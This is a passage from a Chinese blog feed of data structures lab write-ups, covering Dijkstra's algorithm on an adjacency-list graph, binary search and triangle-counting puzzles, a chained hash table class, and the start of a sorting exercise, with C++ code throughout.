class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            dij[i] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x02-addedge"><a href="#0x02-addedge" class="headerlink" title="0x02 addedge"></a>0x02 addedge</h1><p>与<a href="https://www.superpung.xyz/Data-Structures-Experiment-12/">#12</a>基本相同。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Graph::addedge</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> t, <span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    EdgeNode* newEdge = <span class="keyword">new</span> EdgeNode;</span><br><span class="line">    newEdge-&gt;weight = w;</span><br><span class="line">    newEdge-&gt;vertex = t;</span><br><span class="line"></span><br><span class="line">    newEdge-&gt;next = VexList[s].firstAdj;</span><br><span class="line">    VexList[s].firstAdj = newEdge;</span><br><span class="line"></span><br><span class="line">    inDegree[t]++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x03-getV"><a href="#0x03-getV" class="headerlink" title="0x03 getV"></a>0x03 getV</h1><p>判断出度和入度不同时为零。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Graph::getV</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= num_v; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (VexList[i].firstAdj || inDegree[i])</span><br><span class="line">            sum++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x04-dijkstra"><a href="#0x04-dijkstra" class="headerlink" title="0x04 dijkstra"></a>0x04 dijkstra</h1><p><a href="https://v.youku.com/v_show/id_XMjQyOTY1NDQw.html?spm=a2hbt.13141534.app.5~5!2~5!2~5~5~5!2~5~5!2~5!2~5!2~5~5!32~A">什么是dijkstra算法？</a></p>
<p>设顶点数为<code>count</code>，则至多只需<code>count-1</code>次（即<code>left</code>次）更新<code>dij</code>数组即可。</p>
<ul>
<li><p>更新前的准备工作：</p>
<p>声明每次更新时从<code>dij</code>数组找到的未访问过的最小值以及它的下标，<code>visit</code>数组用于判断是否访问过此顶点，并将<code>dij</code>数组初始化（类似广度第一层）。</p>
</li>
<li><p>开始更新：</p>
<ul>
<li><p>先初始化<code>min</code>，找一个未访问过的且距离不为无穷的顶点。若找完后<code>i &gt; count</code>，则说明没有符合条件的顶点，即未访问过的顶点都是无穷远的顶点，说明算法已经结束，直接<code>break</code>。</p>
</li>
<li><p>初始化后，再逐个比较找到最小值，并更新最小值及其下标。成功找到最小值后将该顶点记为已访问。</p>
</li>
<li><p>从最小值顶点开始遍历其链表，设指针为<code>p</code>，判断<code>1</code>-&gt;(不一定直达)-&gt;<code>min_index</code>-&gt;<code>p-&gt;dest</code>路径总权（<code>p-&gt;cost+min</code>）是否比<code>1</code>-&gt;(不一定直达)-&gt;<code>p-&gt;dest</code>（<code>dij[p-&gt;dest]</code>）小，取较小者更新<code>dij[p-&gt;dest]</code>。</p>
</li>
</ul>
</li>
<li><p>更新后：</p>
<ul>
<li><p>观察<code>main.cpp</code>，发现要求dijkstra算法生成的单源最短路数组为从<code>0</code>开始，则只需将<code>dij</code>数组整体前移1位。</p>
</li>
<li><p>释放内存并返回。</p>
</li>
</ul>
</li>
</ul>
<p>完整算法如下。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">Graph::dijkstra</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> min, min_index;</span><br><span class="line">    <span class="keyword">int</span> count = getV();</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> left = count - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">bool</span>* visit = <span class="keyword">new</span> <span class="keyword">bool</span>[count + <span class="number">1</span>];</span><br><span class="line">    EdgeNode* p;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">2</span>; i &lt;= count; i++)</span><br><span class="line">        visit[i] = <span class="literal">false</span>;</span><br><span class="line">    p = VexList[<span class="number">1</span>].firstAdj;</span><br><span class="line">    <span class="keyword">while</span> (p) &#123;</span><br><span class="line">        dij[p-&gt;dest] = p-&gt;cost;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (left--) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">2</span>; i &lt;= count; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dij[i] &gt;= <span class="number">0</span> &amp;&amp; !visit[i]) &#123;</span><br><span class="line">                min = dij[i];</span><br><span class="line">                min_index = i;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt; count)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">2</span>; i &lt;= count; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dij[i] &gt;= <span class="number">0</span> &amp;&amp; dij[i] &lt; min &amp;&amp; !visit[i]) &#123;</span><br><span class="line">                min = dij[i];</span><br><span class="line">                min_index = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        visit[min_index] = <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">        p = VexList[min_index].firstAdj;</span><br><span class="line">        <span class="keyword">while</span> (p) &#123;</span><br><span class="line">            dij[p-&gt;dest] = (p-&gt;cost + min &lt; dij[p-&gt;dest] || dij[p-&gt;dest] == <span class="number">-1</span>) ? </span><br><span class="line">                           (p-&gt;cost + min) : dij[p-&gt;dest];</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">        dij[i] = dij[i + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>[] visit;</span><br><span class="line">    <span class="keyword">return</span> dij;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x05-析构函数"><a href="#0x05-析构函数" class="headerlink" title="0x05 析构函数"></a>0x05 析构函数</h1><p>逐结点释放内存。</p>
<p>若<code>main.cpp</code>末尾有以下语句：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> arr;</span><br><span class="line"><span class="comment">// 在这里可以释放 dijkstra 分配的数组</span></span><br></pre></td></tr></table></figure>
<p>则无需在析构函数中释放<code>dij</code>数组内存。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Graph::~Graph()&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= num_v; i++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (VexList[i].firstAdj) &#123;</span><br><span class="line">            EdgeNode* temp = VexList[i].firstAdj;</span><br><span class="line">            VexList[i].firstAdj = temp-&gt;next;</span><br><span class="line">            <span class="keyword">delete</span> temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span>[] VexList;</span><br><span class="line">    <span class="keyword">delete</span>[] inDegree;</span><br><span class="line">    <span class="keyword">delete</span>[] dij;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x06-补充"><a href="#0x06-补充" class="headerlink" title="0x06 补充"></a>0x06 补充</h1><p>建议增加测试样例，现提供一个如下（供参考）。</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/13g1.gif" alt="13g1"></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Graph <span class="title">g1</span><span class="params">(<span class="number">7</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">g1.addedge(<span class="number">1</span>, <span class="number">2</span>, <span class="number">7</span>);</span><br><span class="line">g1.addedge(<span class="number">1</span>, <span class="number">3</span>, <span class="number">9</span>);</span><br><span class="line">g1.addedge(<span class="number">1</span>, <span class="number">6</span>, <span class="number">14</span>);</span><br><span class="line">g1.addedge(<span class="number">2</span>, <span class="number">3</span>, <span class="number">10</span>);</span><br><span class="line">g1.addedge(<span class="number">2</span>, <span class="number">4</span>, <span class="number">15</span>);</span><br><span class="line">g1.addedge(<span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>);</span><br><span class="line">g1.addedge(<span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>);</span><br><span class="line">g1.addedge(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">g1.addedge(<span class="number">6</span>, <span class="number">5</span>, <span class="number">9</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> len1 = g1.getV();</span><br><span class="line"><span class="keyword">int</span> *arr1 = g1.dijkstra();</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> r_arr1[<span class="number">6</span>] = &#123;<span class="number">0</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">11</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(len1 == <span class="number">6</span>)&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Pass check point 3!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; len1; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(arr1[i] != r_arr1[i]) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i == len1) <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Pass check point 4!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Experiments</tag>
        <tag>Data Structures</tag>
      </tags>
  </entry>
  <entry>
    <title>还不会「查找」？</title>
    <url>/Data-Structures-Experiment-14/</url>
    <content><![CDATA[<p>Data Structures Experiment #14 - 查找</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<h1 id="Puzzle-1"><a href="#Puzzle-1" class="headerlink" title="Puzzle 1"></a>Puzzle 1</h1><blockquote>
<p>给定一个包含<code>n</code>个数字的有序数组，每次查询数组中大于等于数字<code>q</code>的第一个元素。保证<code>q</code>小于等于最大元素。</p>
<p><strong>输入</strong>：</p>
<p>第一行包含两个数字：<code>n</code>，<code>Q</code>，表示数组中元素个数和查询个数。第二行包含<code>n</code>个数字，表示有序数组。接下来<code>Q</code>行每行一个整数<code>q</code>，表示询问元素。（$n\le 10^{6}$，$q\le 10^{5}$）</p>
<p><strong>输出</strong>：</p>
<p>对于每个查询<code>q</code>，输出查询结果。</p>
<p><strong>输入样例</strong>:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">5 3</span><br><span class="line">10 20 30 40 50</span><br><span class="line">2</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td></tr></table></figure>

<p><strong>输出样例</strong>:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">10</span><br><span class="line">50</span><br><span class="line">50</span><br></pre></td></tr></table></figure>
<p>目的是在一个<strong>有序</strong>数组中找到第一个不小于<code>q</code>的数。</p>
</blockquote>
<p>最简单的方法是顺序查找，第一个找到的不小于<code>q</code>的数就是要输出的数。</p>
<p>但是此种方法的平均查找长度较大，当表长较大时不太适用。</p>
<p>注意到数组是有序的，所以可以采用<strong>折半查找</strong>的方式。类似于“二分法”，每次将待查区间缩小一半，缩到最小时便找到了要查找的数值。</p>
<p>对应题目中的变量名称声明变量，读取数组长度、查找次数和数组。</p>
<p>对于每次查找，先置三个“指针”<code>low</code>、<code>mid</code>和<code>high</code>指向表头、表中和表尾。并比较<code>mid</code>处的值<code>arr[mid]</code>和要查找的值<code>q</code>的大小：</p>
<ul>
<li>非常幸运，若<code>arr[mid]</code>等于<code>q</code>，<code>mid</code>之前除了可能的若干个等于<code>q</code>的数之外，一定全都小于<code>q</code>。所以<code>arr[mid]</code>就是我们要找的“第一个”不小于<code>q</code>的数（真正的“第一个”一定与其相等），跳出循环。</li>
<li>一般情况，若<code>arr[mid]</code>不等于<code>q</code>：<ul>
<li>如果<code>mid</code>位置的数比<code>q</code>小，说明<code>q</code>的范围一定在<code>mid</code>的后半段，且此时<code>arr[mid]</code>一定不可能满足要求，故移动<code>low</code>并指向<code>mid</code>的后一个位置，并跟随移动<code>mid</code>；</li>
<li>如果<code>mid</code>位置的数比<code>q</code>大，说明<code>q</code>的范围一定在<code>mid</code>的前半段，但此时<code>arr[mid]</code>可能满足要求，故移动<code>high</code>并指向<code>mid</code>，并跟随移动<code>mid</code>。</li>
</ul>
</li>
</ul>
<p>经过若干次移动和比较，最终会出现两种情况之一跳出了循环：</p>
<ul>
<li>某次<code>mid</code>处的值<code>arr[mid]</code>等于<code>q</code>跳出循环；</li>
<li><code>high</code>与<code>low</code>重合。</li>
</ul>
<p>造成这两种情况的原因都是<code>mid</code>逐渐逼近<code>q</code>，最终指向不小于<code>q</code>的第一个数值（或与其相等的数值）。</p>
<p>即此时<code>mid</code>指向的值就是要输出的值。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, Q, i, q;</span><br><span class="line">    <span class="keyword">int</span> low, high, mid;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; Q;</span><br><span class="line">    <span class="keyword">int</span> *arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">1000000</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; arr[i];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; Q; i++) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; q;</span><br><span class="line">        low = <span class="number">0</span>;</span><br><span class="line">        high = n - <span class="number">1</span>;</span><br><span class="line">        mid = (n - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[mid] == q)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (arr[mid] &lt; q)</span><br><span class="line">                low = mid + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (arr[mid] &gt; q)</span><br><span class="line">                high = mid - <span class="number">1</span>;</span><br><span class="line">            mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; arr[mid] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span>[] arr;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Puzzle-2"><a href="#Puzzle-2" class="headerlink" title="Puzzle 2"></a>Puzzle 2</h1><blockquote>
<p>现在有<code>n</code>个（$n\le 1000$）小木棍，每个小木棍的长度为$len_{i}$（$len_{i}\le 10^{9}$）。从<code>n</code>个木棍中拿出3个，计算多少种取法可以使得三个木棍组成三角形？</p>
<p><strong>输入</strong>：</p>
<p>第一行包含一个整数<code>n</code>，第二行包含<code>n</code>个整数，表示木棍长度。</p>
<p><strong>输出</strong>：</p>
<p>输出一个整数，表示可组成三角形的取法。</p>
<p><strong>输入样例1</strong>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">5</span><br><span class="line">10 20 20 20 30</span><br></pre></td></tr></table></figure>

<p><strong>输出样例1</strong>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">7</span><br></pre></td></tr></table></figure>

<p><strong>输入样例2</strong>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">5</span><br><span class="line">20 20 20 30 20</span><br></pre></td></tr></table></figure>

<p><strong>输出样例2</strong>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">10</span><br></pre></td></tr></table></figure>
<p>判断三边能否构成三角形，只需满足两条<strong>较小边</strong>之和大于第三边，此时任意两边均大于第三边。</p>
</blockquote>
<p>但是如何有序地取三条边且找到较小边而又保证不重复？</p>
<p>由于需要判断边的大小，首先应将未知顺序的数组进行排序。</p>
<p>我们将三角形的三条边分成了<strong>较小的两条</strong>和<strong>最长的一条</strong>，所以可以<strong>以较小两边为基准</strong>或<strong>以最长边为基准</strong>进行查找与判断。当然，以<strong>一条边</strong>为基准要比以<strong>两条边</strong>为基准进行查找判断更为简便。</p>
<p>因为这条基准边是三条边里最长的，而且数组已经按升序排好，所以应从数组最大值处（<code>len[n-1]</code>）开始查找。</p>
<p>已经确定了最长边的位置，那么如何确定两条较小边的位置？</p>
<p>可能会想，最长边是从最大值开始的，较小边就应从最小值和次小值开始。但是要注意，我们判断的是“两条较小边之和<strong>大于</strong>第三边”，所以应该让这两条边一开始就满足“之和大于第三边”更好，可以避免“之和小于第三边”的情况。</p>
<p>但是是不是这两条边取倒数第二位和倒数第三位更好呢？还是要注意我们的目的——判断“两条较小边<strong>之和</strong>大于第三边”，所以两边之和应该<strong>均匀变化</strong>，才能准确找到两边之和的临界值，小于此值的情况则无需考虑。</p>
<p>对比<strong>两条边同时变化</strong>与<strong>一次只变化一条边</strong>，不难看出后者导致之和的变化更均匀。从上一道题中我们得到启发，即查找时应从中间值开始，比从最小到最大（或最大到最小）更为高效。</p>
<p>当最长边取到<code>len[i]</code>时：</p>
<ul>
<li>两边之和的最小值是两边分别取<code>len[0]</code>和<code>len[1]</code>时；</li>
<li>两边之和的最大值是两边分别取<code>len[i-2]</code>和<code>len[i-1]</code>时；</li>
<li>而两边之和的“中位数”是两边分别取<code>len[0]</code>和<code>len[i-1]</code>时（此时虽然不一定是“中位数”，但这样选择更便于操作）。</li>
</ul>
<p>这样我们确定了最长边的位置，以及相对应的两条较小边的起始位置。接下来即进行和的判断：</p>
<ul>
<li><p>若此时两较小边之和比第三边小，则只需将最小边取到数组的下一个元素使和增大，继续判断；</p>
</li>
<li><p>若此时两较小边之和比第三边大，这正是我们想要的结果。假设此时最小边位于<code>p</code>处，次小边位于<code>q</code>处，最长边位于<code>r</code>处，我们可以发现，不仅<code>p</code>、<code>q</code>和<code>r</code>可以构成三角形，而且当<strong>最小边</strong>取<code>p</code>～<code>q-1</code>之间任一值时都满足判断条件（此时用“最小边”是因为稍后“次小边”会变化）。即<code>p</code>～<code>q-1</code>共计<code>q-p</code>种情况都可取。</p>
<p>计数完毕后，将次小边取到数组的上一个元素使和增大，继续判断。</p>
</li>
</ul>
<p>以此类推，和不足时最小边增大，和过剩时次小边减小，最终二者重合使和到达临界（有点类似趋于平衡）：</p>
<ul>
<li>临界之上是次小边的所有取值，且对于每种取值时最小边的所有情况均已计数；</li>
<li>临界之下是所有不满足的情况。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, i;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>* len = <span class="keyword">new</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>[<span class="number">1000</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; len[i];</span><br><span class="line">    sort(len, len + n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt; <span class="number">1</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">int</span> low = <span class="number">0</span>, high = i - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(low &lt; high) &#123;</span><br><span class="line">            <span class="keyword">if</span> (len[low] + len[high] &gt; len[i]) &#123;</span><br><span class="line">                count += (high - low);</span><br><span class="line">                high--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                low++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; count &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">delete</span>[] len;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Experiments</tag>
        <tag>Data Structures</tag>
      </tags>
  </entry>
  <entry>
    <title>还不会实现「哈希」？</title>
    <url>/Data-Structures-Experiment-15/</url>
    <content><![CDATA[<p>Data Structures Experiment #15 - 使用哈希算法完成<code>MyHash</code>类，实现简单的哈希类。</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<blockquote>
<p>添加<code>private</code>属性之后，完善相应的<code>public</code>函数。<br>自选哈希函数，自选解决哈希碰撞的方法。</p>
<ul>
<li><code>MyHash(int max_element);</code><br>构造函数，构造一个元素最多为<code>max_element</code>的哈希表。</li>
<li><code>~MyHash();</code><br>析构函数。</li>
<li><code>void setvalue(int key, int value);</code><br>将哈希表中键值为<code>key</code>的元素设定值改为<code>value</code>。（哈希表中没有被<code>setvalue</code>的键值默认值为<code>0</code>）</li>
<li><code>int getvalue(int key);</code><br>获得哈希表中键值为<code>key</code>的元素的对应<code>value</code>值。</li>
</ul>
</blockquote>
<p><a href="https://zh.wikipedia.org/wiki/%E5%93%88%E5%B8%8C%E8%A1%A8">什么是哈希表？</a></p>
<p>此处选取哈希函数的构造方法为“除留余数法”，解决哈希碰撞的方法为“链地址法”。</p>
<p>众所周知，数组查找容易，但插入和删除困难；链表查找困难，但插入和删除容易。哈希表作为二者的结合，查找容易，插入和删除也容易。</p>
<p>创建哈希表为一个数组。为加快检索，将<code>key</code>值对某一固定值<code>p</code>取余后余数相同的归为一类（即数论中的“同余类/剩余类”），以链表的形式存放到数组中对应第“余数”个元素处，构成“完全剩余系”。</p>
<h1 id="0x00-数据域封装"><a href="#0x00-数据域封装" class="headerlink" title="0x00 数据域封装"></a>0x00 数据域封装</h1><p>将数组的每个元素加上一个头指针，用于指向链表头。链表每个结点包括<code>key</code>值和<code>value</code>值。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">        <span class="keyword">int</span> value;</span><br><span class="line">        <span class="keyword">int</span> key;</span><br><span class="line">        node* next;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">table</span> &#123;</span></span><br><span class="line">        node* head;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    table* HashTable;</span><br></pre></td></tr></table></figure>
<h1 id="0x01-构造函数"><a href="#0x01-构造函数" class="headerlink" title="0x01 构造函数"></a>0x01 构造函数</h1><p>根据最大元素数为1000，可以定义固定的模<code>p</code>为997（小于1000的最大素数）。</p>
<p>若取模为合数，即存在小于自身的因子，则每个含有此因子的<code>key</code>值都会映射到数组的相同元素，从而造成局部链表加长，这显然不利于我们快速查找。</p>
<p>由于取模为997，则所有<code>key</code>值映射后的范围是0～996，所以数组大小取<code>p-1</code>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> p 997</span></span><br><span class="line"></span><br><span class="line">MyHash::MyHash(<span class="keyword">int</span> max_element)&#123;</span><br><span class="line">    HashTable = <span class="keyword">new</span> table[p - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; p - <span class="number">1</span>; i++)</span><br><span class="line">        HashTable[i].head = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x02-setValue"><a href="#0x02-setValue" class="headerlink" title="0x02 setValue"></a>0x02 setValue</h1><p>插入链表，类似栈的LIFO存储方式。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyHash::setvalue</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> value)</span></span>&#123;</span><br><span class="line">    node* newNode = <span class="keyword">new</span> node;</span><br><span class="line">    newNode-&gt;key = key;</span><br><span class="line">    newNode-&gt;value = value;</span><br><span class="line">    newNode-&gt;next = HashTable[key % p].head;</span><br><span class="line">    HashTable[key % p].head = newNode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x03-getValue"><a href="#0x03-getValue" class="headerlink" title="0x03 getValue"></a>0x03 getValue</h1><p>先确定余数的值，即其所在链表位于数组中的位置，然后遍历链表查找。</p>
<p>注意“哈希表中没有被<code>setvalue</code>的键值默认值为<code>0</code>”。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MyHash::getvalue</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">    node* temp = HashTable[key % p].head;</span><br><span class="line">    <span class="keyword">while</span> (temp) &#123;</span><br><span class="line">        <span class="keyword">if</span> (temp-&gt;key == key)</span><br><span class="line">            <span class="keyword">return</span> temp-&gt;value;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x04-析构函数"><a href="#0x04-析构函数" class="headerlink" title="0x04 析构函数"></a>0x04 析构函数</h1><p>逐个链表释放内存。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">MyHash::~MyHash()&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; p - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        node* temp = HashTable[i].head;</span><br><span class="line">        <span class="keyword">while</span> (temp) &#123;</span><br><span class="line">            node* q = temp;</span><br><span class="line">            temp = temp-&gt;next;</span><br><span class="line">            <span class="keyword">delete</span> q;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span>[] HashTable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Experiments</tag>
        <tag>Data Structures</tag>
      </tags>
  </entry>
  <entry>
    <title>还不会「冒泡排序」、「快排」和「堆排序」？</title>
    <url>/Data-Structures-Experiment-16/</url>
    <content><![CDATA[<p>Data Structures Experiment #16 - 排序</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<blockquote>
<p>在<code>MySort.cpp</code>中完成三个排序方法。</p>
<ul>
<li><code>bubbleSort(int* arr, int len);</code><br>实现冒泡排序，需要排序的数组为<code>arr</code>，数组长度为<code>len</code></li>
<li><code>quickSort(int* arr, int len);</code><br>实现快速排序</li>
<li><code>heapSort(int* arr, int len);</code><br>实现堆排序    </li>
</ul>
</blockquote>
<p>注：排序结果均为升序。</p>
<h1 id="bubbleSort"><a href="#bubbleSort" class="headerlink" title="bubbleSort"></a>bubbleSort</h1><p>冒泡排序的思路就是从头到尾进行遍历，如果某一项比下一项大，就将这两项交换，最终导致最大项移动到末尾。</p>
<p>注意，当某一次遍历<code>0</code>到<code>i</code>时，若整个过程中未发生任何交换，即<code>0</code>到<code>i</code>的每一项均小于它的下一项，说明此时数组已经排好序（<code>i+1</code>到<code>len-1</code>已经为升序），此时即可跳出循环，算法结束。</p>
<p>按照以上思路设计算法：</p>
